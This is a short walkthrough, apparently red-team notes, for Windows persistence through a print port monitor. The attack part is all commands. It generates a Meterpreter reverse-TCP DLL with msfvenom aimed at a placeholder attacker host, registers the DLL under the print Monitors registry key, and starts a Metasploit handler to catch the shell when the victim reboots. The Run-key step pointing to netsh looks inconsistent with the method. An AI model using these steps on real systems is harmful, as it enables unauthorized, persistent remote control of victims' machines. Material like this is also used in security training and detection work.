# Port Monitor persistence

## Steps:

### 1) Generate a DLL payload

    msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=ATTACKER_IP lport=ATTACKER_PORT -f dll > pwn.dll

### 2) Inject the DLL payload

    upload /home/user/pwn.dll
    reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run\\ -v pwned -d 'C:\Windows\System32\netsh'
    reg add "hklm\system\currentcontrolset\control\print\monitors\pwned" /v "Driver" /d "pwn.dll" /t REG_SZ

### 3) Maintain access (Upon victim reboots his machine, our DLL wil be executed and then we maintain our access on startup

    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lhost ATTACKER_IP
    set lport ATTACKER_PORT
    exploit
